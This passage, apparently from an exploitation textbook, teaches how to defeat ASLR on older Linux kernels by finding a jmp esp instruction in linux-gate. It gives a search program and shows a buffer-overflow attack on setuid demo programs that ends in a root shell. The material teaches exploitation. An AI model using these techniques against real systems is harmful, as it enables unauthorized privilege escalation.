<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x6c2  Bouncing Off linux-gate</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part158.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part160.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark146">0x6c2  Bouncing Off linux-gate</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">The technique described below doesn’t work with Linux kernels starting from 2.6.18. This technique gained some popularity and, of course, the developers patched the problem. The kernel used in the included LiveCD is 2.6.20, so the output below is from the machine loki, which is running a</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">2.6.17 Linux kernel. Even though this particular technique doesn’t work on the LiveCD, the concepts behind it can be applied in other useful ways.</p><p class="s27" style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 106%;text-align: left;">Bouncing off linux-gate <span class="p">refers to a shared object, exposed by the kernel, which looks like a shared library. The program ldd shows a program’s shared library dependencies. Do you notice anything interesting about the linux-gate library in the output below?</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1190.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">matrix@loki /hacking $ $ uname -a</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Linux hacking 2.6.17 #2 SMP Sun Apr 11 03:42:05 UTC 2007 i686 GNU/Linux matrix@loki /hacking $ cat /proc/sys/kernel/randomize_va_space</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">matrix@loki /hacking $ ldd ./aslr_demo</p><p class="s46" style="padding-left: 53pt;text-indent: 0pt;text-align: left;">linux-gate.so.1 =&gt; (0xffffe000)</p><p class="s31" style="padding-left: 53pt;text-indent: 0pt;text-align: left;">libc.so.6 =&gt; /lib/libc.so.6 (0xb7eb2000)</p><p class="s31" style="padding-left: 19pt;text-indent: 34pt;line-height: 107%;text-align: left;">/lib/ld-linux.so.2 (0xb7fe5000) matrix@loki /hacking $ ldd /bin/ls</p><p class="s46" style="padding-left: 53pt;text-indent: 0pt;line-height: 107%;text-align: left;">linux-gate.so.1 =&gt;  (0xffffe000) <span class="s31">librt.so.1 =&gt; /lib/librt.so.1 (0xb7f95000) libc.so.6 =&gt; /lib/libc.so.6 (0xb7e75000)</span></p><p class="s31" style="padding-left: 53pt;text-indent: 0pt;text-align: left;">libpthread.so.0 =&gt; /lib/libpthread.so.0 (0xb7e62000)</p><p class="s31" style="padding-left: 19pt;text-indent: 34pt;line-height: 107%;text-align: left;">/lib/ld-linux.so.2 (0xb7fb1000) matrix@loki /hacking $ ldd /bin/ls</p><p class="s46" style="padding-left: 53pt;text-indent: 0pt;line-height: 106%;text-align: left;">linux-gate.so.1 =&gt;  (0xffffe000) <span class="s31">librt.so.1 =&gt; /lib/librt.so.1 (0xb7f50000) libc.so.6 =&gt; /lib/libc.so.6 (0xb7e30000)</span></p><p class="s31" style="padding-left: 53pt;text-indent: 0pt;text-align: left;">libpthread.so.0 =&gt; /lib/libpthread.so.0 (0xb7e1d000)</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 34pt;line-height: 107%;text-align: left;">/lib/ld-linux.so.2 (0xb7f6c000) matrix@loki /hacking $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1191.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Even in different programs and with ASLR enabled, linux-gate.so.1 is always present at the same address. This is a virtual dynamically shared object used by the kernel to speed up system calls, which means it’s needed in every process. It is loaded straight from the kernel and doesn’t exist anywhere on disk.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The important thing is that every process has a block of memory contain- ing linux-gate’s instructions, which are always at the same location, even with ASLR. We are going to search this memory space for a certain assembly instruction, <span class="s31">jmp esp</span>. This instruction will jump EIP to where ESP is pointing.</p><p style="padding-left: 109pt;text-indent: 0pt;line-height: 11pt;text-align: left;">First, we assemble the instruction to see what it looks like in machine code.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1192.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">matrix@loki /hacking $ cat &gt; jmpesp.s BITS 32</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">jmp esp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">matrix@loki /hacking $ nasm jmpesp.s matrix@loki /hacking $ hexdump -C jmpesp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000  ff e4                        |..|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000002</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">matrix@loki /hacking $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1193.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Using this information, a simple program can be written to find this pattern in the program’s own memory.</p><p class="s40" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">find_jmpesp.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1194.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">int main()</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">unsigned long linuxgate_start = 0xffffe000; char *ptr = (char *) linuxgate_start;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int i;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">for(i=0; i &lt; 4096; i++)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 116pt;text-indent: -8pt;line-height: 107%;text-align: left;">if(ptr[i] == &#39;\xff&#39; &amp;&amp; ptr[i+1] == &#39;\xe4&#39;) printf(&quot;found jmp esp at %p\n&quot;, ptr+i);</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1195.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">When the program is compiled and run, it shows that this instruction exists at <span class="s31">0xffffe777</span>. This can be further verified using GDB:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1196.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">matrix@loki /hacking $ ./find_jmpesp found jmp esp at 0xffffe777</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">matrix@loki /hacking $ gdb -q ./aslr_demo</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;. (gdb) break main</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1 at 0x80483f0: file aslr_demo.c, line 7. (gdb) run</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /hacking/aslr_demo</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, main (argc=1, argv=0xbf869894) at aslr_demo.c:7</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">7       printf(&quot;buffer is at %p\n&quot;, &amp;buffer); (gdb) x/i 0xffffe777</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xffffe777:  jmp  esp (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1197.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Putting it all together, if we overwrite the return address with the address <span class="s31">0xffffe777</span>, then execution will jump into linux-gate when the main function returns. Since this is a <span class="s31">jmp esp </span>instruction, execution will immediately jump back out of linux-gate to wherever ESP happens to be pointing. From our previous debugging, we know that at the end of the main function, ESP is pointing to memory directly after the return address. So if shellcode is put here, EIP should bounce right into it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1198.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">matrix@loki /hacking $ sudo chown root:root ./aslr_demo matrix@loki /hacking $ sudo chmod u+s ./aslr_demo</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">matrix@loki /hacking $ ./aslr_demo $(perl -e &#39;print &quot;\x77\xe7\xff\xff&quot;x20&#39;)$(cat scode.bin) buffer is at 0xbf8d9ae0</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">sh-3.1#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1199.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This technique can also be used to exploit the notesearch program, as shown here.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1200.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">matrix@loki /hacking $ for i in `seq 1 50`; do ./notesearch $(perl -e &quot;print &#39;AAAA&#39;x$i&quot;); if [</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">$? == 139 ]; then echo &quot;Try $i words&quot;; break; fi; done [DEBUG] found a 34 byte note for user id 1000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[DEBUG] found a 41 byte note for user id 1000 [DEBUG] found a 63 byte note for user id 1000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">-------[ end of note data ]-------</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">*** OUTPUT TRIMMED ***</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">[DEBUG] found a 34 byte note for user id 1000 [DEBUG] found a 41 byte note for user id 1000 [DEBUG] found a 63 byte note for user id 1000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- Segmentation fault</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Try 35 words</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">matrix@loki /hacking $ ./notesearch $(perl -e &#39;print &quot;\x77\xe7\xff\xff&quot;x35&#39;)$(cat scode.bin) [DEBUG] found a 34 byte note for user id 1000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[DEBUG] found a 41 byte note for user id 1000 [DEBUG] found a 63 byte note for user id 1000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-------[ end of note data ]-------</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Segmentation fault</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">matrix@loki /hacking $ ./notesearch $(perl -e &#39;print &quot;\x77\xe7\xff\xff&quot;x36&#39;)$(cat scode2.bin) [DEBUG] found a 34 byte note for user id 1000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[DEBUG] found a 41 byte note for user id 1000 [DEBUG] found a 63 byte note for user id 1000</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- sh-3.1#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1201.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The initial estimate of 35 words was off, since the program still crashed with the slightly smaller exploit buffer. But it is in the right ballpark, so a manual tweak (or a more accurate way to calculate the offset) is all that is needed.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Sure, bouncing off linux-gate is a slick trick, but it only works with older Linux kernels. Back on the LiveCD, running Linux 2.6.20, the useful instruc- tion is no longer found in the usual address space.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1202.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ uname -a</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">Linux hacking 2.6.20-15-generic #2 SMP Sun Apr 15 07:36:31 UTC 2007 i686 GNU/Linux reader@hacking:~/booksrc $ gcc -o find_jmpesp find_jmpesp.c reader@hacking:~/booksrc $ ./find_jmpesp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g -o aslr_demo aslr_demo.c reader@hacking:~/booksrc $ ./aslr_demo test</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">buffer is at 0xbfcf3480 reader@hacking:~/booksrc $ ./aslr_demo test buffer is at 0xbfd39cd0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo SHELLCODE will be at 0xbfc8d9c3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo SHELLCODE will be at 0xbfa0c9c3</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1203.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Without the <span class="s31">jmp esp </span>instruction at a predictable address, there is no easy way to bounce off of linux-gate. Can you think of a way to bypass ASLR to exploit aslr_demo on the LiveCD?</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part158.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part160.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
